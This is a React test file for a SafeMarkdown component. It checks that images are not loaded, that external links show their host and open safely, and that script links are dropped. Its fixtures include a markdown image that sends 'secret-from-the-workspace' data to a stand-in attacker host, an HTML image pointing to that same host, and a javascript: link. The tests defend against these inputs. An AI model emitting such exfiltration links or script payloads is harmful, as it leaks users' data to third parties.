import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { SafeMarkdown, externalHost } from "../components/SafeMarkdown";

describe("SafeMarkdown", () => {
  it("does not render an image, so nothing is requested for it", () => {
    const { container } = render(<SafeMarkdown>{"Answer ![chart](https://evil.example/leak.png?d=secret-from-the-workspace) done"}</SafeMarkdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText(/Image not loaded: chart/)).toBeTruthy();
    expect(container.innerHTML).not.toContain("src=");
  });

  it("does not render raw HTML images either", () => {
    const { container } = render(<SafeMarkdown>{'<img src="https://evil.example/x.png"> text'}</SafeMarkdown>);
    expect(container.querySelector("img")).toBeNull();
  });

  it("shows where an external link goes and opens it safely", () => {
    const { container } = render(<SafeMarkdown>{"[the docs](https://docs.example.org/guide)"}</SafeMarkdown>);
    const link = container.querySelector("a");
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toContain("noopener");
    expect(link?.getAttribute("rel")).toContain("noreferrer");
    expect(container.textContent).toContain("(docs.example.org)");
  });

  it("does not repeat a host the link text already shows", () => {
    const { container } = render(<SafeMarkdown>{"[docs.example.org](https://docs.example.org/guide)"}</SafeMarkdown>);
    expect(container.textContent).toBe("docs.example.org");
  });

  it("drops script links", () => {
    const { container } = render(<SafeMarkdown>{"[click](javascript:alert(1))"}</SafeMarkdown>);
    expect(container.querySelector("a")?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  it("only names the host of web addresses", () => {
    expect(externalHost("https://a.example/x")).toBe("a.example");
    expect(externalHost("mailto:me@example.com")).toBeNull();
    expect(externalHost("#section")).toBeNull();
    expect(externalHost(undefined)).toBeNull();
  });
});
